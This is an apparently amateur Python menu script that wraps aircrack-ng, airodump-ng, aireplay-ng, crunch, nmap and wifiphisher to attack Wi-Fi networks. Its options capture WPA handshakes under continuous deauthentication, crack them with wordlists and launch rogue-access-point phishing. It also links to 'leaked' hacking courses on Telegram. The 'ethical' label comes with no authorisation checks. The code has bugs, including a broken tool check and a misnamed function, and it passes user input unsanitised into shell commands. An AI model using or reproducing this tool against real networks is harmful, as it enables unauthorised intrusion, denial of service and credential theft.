#!/usr/bin/env python3
# Author: NEMO FROM IRAQ
# Ethical Hacking Tools (For Education and Research Purposes
import os,time,webbrowser

#اللوان

B="\033[38;5;27m"   #ازرق
G="\033[38;5;46m"   #اخضر
r="\033[38;5;196m"  #احمر
C="\033[38;5;44m"   #سمائي
M="\033[38;5;141m"  #بنفسجي
N="\033[0m"         #الطبيعي
RB="\033[101m"
reset="\033[0m"
WT="\033[97m"
GB="\033[42m"
BB="\033[40m"

# التحقق من نضام التشغيل وتثبيت المكاتب على جميع الانضمة دون اخطاء
def Install_tools():
 #   os.system('clear' if os.name == 'posix' else  'cls')
 #   libraries = ['sys','webbrowser']
 #   print(f" {G}    -_جاري التحقق من وجود المكاتب_-")
 #   for lib in libraries:
 #     try:
 #       __import__(lib)
 #       print(f"{M}╔═══════════════════════════════════════╗")
 #       print(f"{M}║{r}   موجودة   - {G}{lib}{r} - المكتبة      {M}     ║ ")
 #       print(f"{M}╚═══════════════════════════════════════╝\n")
 #       time.sleep(3)
 #     except ImportError:
 #       print(f"{C} _________________________________________________________\n")
 #       print(f"{G}ما موجودة راح اثبتها الك الان - {r}{lib}{G} - المكتبة  ")
 #       time.sleep(2)
 #       os.system("pip install" + lib)
#التحقق من وجود الادوات المطلوبة
        os.system('clear' if os.name == 'posix' else  'cls')
        tools = ["aircrack-ng", "crunch", "xterm", "wifite", "airodump-ng", "nmap"]
        print(f"""
        {r}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
        {r}  ■  {G}  جارٍ التحقق من وجود الأدوات ال تي نحتاجها  {r}■
        {r}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
        """)
        time.sleep(3)
        for tool in tools:
          check = os.system(f"which {tool} > /dev/null 2>&1")
        if check == 0:
           print(f" |{r} ✓ موجودة -{G} {tool} {N}- {r}الاداة |")
           time.sleep(2)
           os.system('clear' if os.name == 'posix' else  'cls')
        else:
           os.system('clear' if os.name == 'posix' else  'cls')
           print(f"{G}■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n")
           print(f" | غير مثبته سيتم تثبيتها  -{r}{tool}{N}- الاداة |")
           time.sleep(2)
           os.system(f"apt install {tool}")
           os.system('clear' if os.name == 'posix' else  'cls')


# Functions for Wireless Network and WPS Attacks
def start_monitor_mode(interface):#1
    print(f"{G}_____________________________________________________\n")
    print(f"Starting monitor mode on {interface}...\n")
    time.sleep(1.2)
    os.system(f"airmon-ng start {interface} && airmon-ng check kill")

def stop_monitor_mode(interface):#2
    print(f"{G}_____________________________________________________\n")
    print(f"Stopping monitor mode on {interface}...\n")
    time.sleep(1.2)
    os.system(f"airmon-ng stop {interface} && service network-manager restart")

def scan_networks(interface):#3
    print(f"{G}_____________________________________________________\n")
    print(f"Scanning for networks on {interface}...\n")
    time.sleep(1.2)
    os.system(f"xterm -bg black -fg green -hold -e airodump-ng -M {interface} ")

def get_handshake(interface, bssid, channel, path, packets):#4
    print(f"{G}_____________________________________________________\n")
    print(f"Capturing handshake from {bssid} on channel {channel}...")
    os.system(f"xterm -hold -e airodump-ng --bssid {bssid} -c {channel} -w {path} {interface} | xterm -bg black -fg red -fs 8 -e aireplay-ng --deauth 0{packets} -a {bssid} {interface} &")
    while True:
        verify_that_the_file_exists = os.system(f"ls {path}???.cap 1>/dev/null 2>&1 ")
        if verify_that_the_file_exists  == 0:
            print(f"{RB}{G}The handshake file has been obtainrd{r}-{G}{path}{r}-{G}. Press {N}Enter {G}to return to the main menu...{reset}")
            i = input("")
            if i == 0:
                pass
            break
        else:
            pass
def crack_handshake_with_wordlist_rockyou(handshake_path):#5
    print(f"{G}_____________________________________________________\n")
    print(f"{G}Cracking handshake from {r}{handshake_path}{G} using wordlist {r} rockyou.txt {G}...")
    os.system(f"xterm -fg red -hold -e aircrack-ng {handshake_path} -w rockyou.txt")
    time.sleep(1.5)
            

def crack_handshake_with_wordlist(handshake_path,wordlist_path):#6
    print(f"{G}_____________________________________________________\n")
    print(f"Cracking handshake from {handshake_path} using wordlist {wordlist_path}...")
    time.sleep(1.5)
    os.system(f"aircrack-ng {handshake_path} -w {wordlist_path}")
    time.sleep(3)
def Breaking_a_multi_network_handshake_with_a_custom_password(handshake_path, essid, wordlistpath):#7
    print(f"{G}_____________________________________________________\n")
    print(f"Cracking handshake from{r} {handshake_path}{G} with ESSID{r} {essid} {G}Using a password file{r} {wordlistpath}{G}...")
    os.system(f"aircrack-ng {handshake_path} -e {essid} -w {wordlistpath}")

# Functions to Create Wordlist and Perform WPS Attack
def create_wordlist(min_length, max_length, characters, output_path, Repeat_number):#8
    print(f"{G}_____________________________________________________\n")
    print(f"Creating wordlist with length from {min_length} to {max_length}...")
    os.system(f"crunch {min_length} { max_length} {characters} -o {output_path} -d {Repeat_number}")     

# Nmap Network Scanning
def scan_networks_with_nmap(target_ip):#9
    print(f"Scanning network with Nmap on target {target_ip}...")
    os.system(f"xterm -hold -e nmap -sn {target_ip}")

# Phishing Attack with Wifiphisher
def perform_phishing_attack(interface, bssid):#10
    print(f"Performing phishing attack on {bssid}...")
    os.system(f"wifiphisher -i {interface} -b {bssid}")

def clean_input_str(prompt):
    while True:
        value = input(prompt).strip()
        print("\033[F\033[K", end="")
        if value:
            return value

def clean_input_int(prompt):
    while True:
        value = input(prompt).strip()
        print("\033[F\033[K", end="")
        if value.isdigit():
            return int(value)

# Main menu to interact with the script
def main():
    while True:
        os.system('clear' if os.name == 'posix' else  'cls')
        print(f"""
        
{r} _    _            _    _               ____ ___          _     
{r}| |  | |          | |  (_)             |__   __|        | |    
{r}| |__| | __ _  ___| | ___ _ __   __ _     | | ___   ___ | |___ 
{r}|  __  |/ _` |/ __| |/ / | '_ \ / _` |    | |/ _ \ / _ \| / __|
{r}| |  | | (_| | (__|   <| | | | | (_| |    | | (_) | (_) | \__ \
{r}
{r}|_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |    |_|\___/ \___/|_|___/
{r}                                 __/ |                         
{r}                                |___/                          

                                {r} V-1


         {r}|#############################|   {r} Author : NEMO FROM IRAQ 
         {r}|#############################|
         {G}|      #### لله اكبر ####     |
         {N}|#############################|
         {N}|#############################|
         
      
      
               {r}  Tools : {G}A collection of ethical Hacking Tools.        {N}                                                       
    ---------------------------------------------------------------------------------  

            Menu:
            1) Start monitor mode
            2) Stop monitor mode
            3) Scan networks
            4) Capture handshak
            5) Crack handshake (rockyou.txt)
            6) Crack handshake with custom wordlist
            7) Breaking a multi network handshake with a custom password
            8) Create wordlist
            9) Scan network with Nmap
            10) Perform phishing attack with Wifiphisher
            11) Leaked ethical hacking courses in Arabic
            12) Install the Tools to avoid errors
            00) About Me [important]
            0) Exit
    ---------------------------------------------------------------------------------  
        """)

        choice = input(f"{B}Enter your choice: {M} ")

        if choice == '1':
            
            interface = clean_input_str(f"{M}Enter the interface: {G}")
            start_monitor_mode(interface)
        elif choice == '2':
            interface = clean_input_str(f"{M}Enter the interface: {G} ")
            stop_monitor_mode(interface)
        elif choice == '3':
            interface = clean_input_str(F"{M}Enter the interface: {G} ")
            scan_networks(interface)
        elif choice == '4':
            interface = clean_input_str(f"{M}Enter the interface: {G} ")
            print(interface)
            bssid = clean_input_str(f"{M}Enter the target BSSID: {G} ")
            print(bssid)
            channel = clean_input_int(f"{M}Enter the channel:{ G} ")
            print(channel)
            path = clean_input_str(f"{M}Enter the path for output file: {G} ")
            print(path)
            packets = clean_input_int(f"{M}Enter the number of packets: {G} ")
            print(packets)
            get_handshake(interface, bssid, channel, path, packets)
        elif choice == '5':
            handshake_path = clean_input_str(F"{M}Enter the handshake file path: {G} ")
            crack_handshake_with_wordlist_rockyou(handshake_path)
        elif choice == '6':
            handshake_path = clean_input_str(F"{M}Enter the handshake file path: {G} ")
            print(handshake_path)
            wordlist_path = clean_input_str(F"{M}Enter the wordlist file path: {G} ")
            print(wordlist_path)
            Crack_handshake_with_wordlist(handshake_path, wordlist_path)
        elif choice == '7':
            handshake_path = clean_input_str(F"{M}Enter the handshake file path: {G} ")
            essid = clean_input_str(F"{M}Enter the ESSID:{G} ")
            wordlistpath = clean_input_str(f"{M}Enter the password file name : {G}")
            Breaking_a_multi_network_handshake_with_a_custom_password(handshake_path, essid, wordlistpath)
        elif choice == '8':
            min_length = clean_input_int(f"{M}Enter the minimum length of passwords: {G}")
            max_length = clean_input_int(f"{M}Enter the maximum length of passwords: {G}")
            characters = clean_input_str(f"{M}Enter characters for the wordlist: {G} ")
            output_path = clean_input_str(f"{M}Enter the output path for the wordlist: {G} ")
            Repeat_number = clean_input_int(f"{M}Enter the number of times the number is repeated: {G}")
            create_wordlist(min_length, max_length, characters, output_path, Repeat_number)
        elif choice == '9':
            target_ip = input(f"{M}Enter the target IP for Nmap scan: {G} ")
            scan_networks_with_nmap(target_ip)
        elif choice == '10':
            interface = clean_input_str(f"{M}Enter the interface: {G} ")
            bssid = clean_input_str(f"{M}Enter the BSSID: {G} ")
            perform_phishing_attack(interface, bssid)
        elif choice == '11':
            channell = input(f"{G}\nLeaked ethical hacking courses in Arabic.Press Enter to go to the courses...")
            time.sleep(2)
            webbrowser.open("https://t.me/Hacking_learning_course")        
        elif choice == '12':
            time.sleep(1.8)
            Install_tools()
        elif choice == '00':
            print(f""" 
  {r}  👤 About Me :

    {G}    Security tools developer and penetration testing researcher focused on building fast,
        efficient, and user-friendly offensive utilities. I aim to create practical tools that 
        enhance workflow and support the cybersecurity community with reliable and professional solutions.

  {r}  🛠️  About This Tool :

    {G}    This tool is under continuous development and will keep receiving improvements,
        optimizations, and new modules to ensure a powerful, evolving, and all-in-one security testing environment.

    {r}🤝 Support & Contribution :

      {G}  For help, suggestions, or contributions, feel free to contact me on Telegram
          
        {r}                 /\    @TEAM313_IRAQ    /\ {N}
            
               {RB} Press Enter to return to the main menu...{reset}

             """)
            return_menu = input("")
            if return_menu == 0:
                pass
        elif choice == '0':
            print(F"{RB}Exiting...{reset}")
            time.sleep(1.5)
            break
        else:
            pass
            

if __name__ == "__main__":
    try:
       main()
    except KeyboardInterrupt:
        print(f"""{r}\n\nInvalid choice, please try again...\n
     {G}   -hacker Nemo- \n  """)
        time.sleep(1.5)


#Team 313 Iraq - Author  NEMO - I do not allow my rights to be changed.